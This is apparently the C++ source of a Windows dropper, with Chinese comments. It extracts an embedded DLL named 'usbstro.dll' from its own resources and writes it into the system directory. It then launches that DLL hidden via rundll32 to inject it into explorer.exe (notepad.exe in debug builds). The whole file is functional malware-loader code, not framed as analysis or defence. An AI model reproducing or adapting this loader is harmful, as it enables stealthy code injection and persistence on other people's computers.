// Install.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

enum { DLL_FILE_LENGTH = 356352 };

#ifdef _DEBUG
const char* g_szInjectTarget = "notepad.exe";
#else
const char* g_szInjectTarget = "explorer.exe";
#endif
const char* g_szDllname      = "usbstro.dll";

std::string GetTempFilename()
{
	TCHAR szTempPath[MAX_PATH+1] = { 0 };
	GetTempPath(sizeof(szTempPath)/sizeof(szTempPath[0]), szTempPath);
	GetTempFileName(szTempPath, _T("USB_"), 0, szTempPath);
	strcpy(strrchr(szTempPath, '.'), ".dll");

	return std::string (szTempPath);
}

void LauchUSBStro()
{
	// 启动USBSTRO
	char szBuf[1024];
	sprintf(szBuf, "rundll32.exe %s,Install %s",
	g_szDllname,
	g_szInjectTarget);
	WinExec(szBuf, SW_HIDE);
}

// 得到系统文件路径
std::string GetSystemPath()
{
	CHAR szSysPath[MAX_PATH+1];

	GetSystemDirectory(szSysPath, MAX_PATH);
	return szSysPath;
}

HRSRC FindDll()
{
	HRSRC hRes = FindResource(0, "#101", "FILE");
	if(hRes) {
		return hRes;
	}
	else {
		printf("Find DLL: %d\n", GetLastError());
	}
	return 0;
}

void parseArg()
{
	if(__argc < 2) {
		return;
	}
	g_szInjectTarget = __argv[1];
	if(__argc < 3) {
		return;
	}
	g_szDllname		 = __argv[2];
}

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow)
#else
int _tmain(int argc, _TCHAR* argv[])
#endif
{
	// 处理参数
	parseArg();

	HRSRC hRes = FindDll();
	HGLOBAL hGlobal = LoadResource(0, hRes);
	if(hGlobal)
	{
		const char* lpData = (const char*)LockResource(hGlobal);
		if(lpData) {
			std::string sFile = GetSystemPath();
			sFile += "\\";
			sFile += g_szDllname;
			std::ofstream fout(sFile.c_str(), std::ios::binary);
			if(!fout.good()) {
				printf("open file %s failed\n", sFile.c_str());
				return -1;
			}
			fout.write(lpData, DLL_FILE_LENGTH);
			fout.close();
			printf("%s writed\n", sFile.c_str());
			LauchUSBStro();
		}
		else {
			printf("%d\n", GetLastError());
		}
	}
	else {
		printf("%d\n", GetLastError());
	}

	return 0;
}

